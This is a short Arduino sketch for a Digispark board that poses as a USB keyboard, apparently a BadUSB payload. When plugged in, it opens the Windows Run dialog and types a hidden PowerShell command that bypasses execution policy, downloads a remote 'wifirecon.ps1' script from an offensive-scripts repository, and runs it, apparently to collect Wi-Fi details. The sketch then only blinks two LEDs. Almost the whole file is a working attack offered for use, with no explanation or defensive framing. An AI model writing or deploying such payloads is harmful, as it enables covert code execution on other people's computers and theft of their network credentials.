#include "DigiKeyboard.h"
void setup() {
  pinMode(0, OUTPUT);
  pinMode(1, OUTPUT);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -exec bypass -windowstyle hidden -c IEX(New-object Net.Webclient).Downloadstring('https://raw.githubusercontent.com/timebotdon/offensive-scripts/master/Windows/wifirecon.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  delay(500);
  digitalWrite(0, LOW);
  digitalWrite(1, LOW);
  delay(500);
}
